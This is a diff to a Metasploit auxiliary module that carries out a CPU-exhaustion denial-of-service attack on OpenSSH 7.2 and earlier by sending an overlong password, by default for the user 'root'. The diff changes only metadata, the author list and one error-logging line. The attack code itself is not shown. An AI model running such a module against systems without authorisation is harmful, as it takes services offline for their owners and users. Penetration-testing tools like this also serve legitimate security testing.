@@ -14,15 +14,19 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'OpenSSH Pre-7.3 CPU Consumption Denial of Service',
+      'Name'           => 'OpenSSH Pre-7.3 Crypt CPU Consumption Denial of Service',
       'Description'    => %q{
         This module exploits a password length bug in OpenSSH 7.2
         and earlier. The module sends a SSH connection request with
-        a random 16 character username and a random 90000 character password.
+        the username as 'root' (unless specified otherwise) and a random 90000 character password.
         Because the password is so long, it exhausts the CPU, causing the service
         to crash.
       },
-      'Author'         => [ 'Carter Brainerd <@thecarterb>' ],
+      'Author'         => 
+        [
+          'Carter Brainerd <@thecarterb>',
+          'Kashinath T'  
+        ],
       'License'        => MSF_LICENSE
     ))
     register_options(
@@ -82,7 +86,7 @@ class MetasploitModule < Msf::Auxiliary
         return if !hostup
         next  # Only get here if host isn't up
       rescue Net::SSH::Exception => e  # This means something actually went wrong
-        vprint_error("#{rhost}:#{rport} - #{e.class}: #{e.message}")
+        print_error("#{rhost}:#{rport} - #{e.class}: #{e.message}")
         next  # Continue anyway
       end
     end
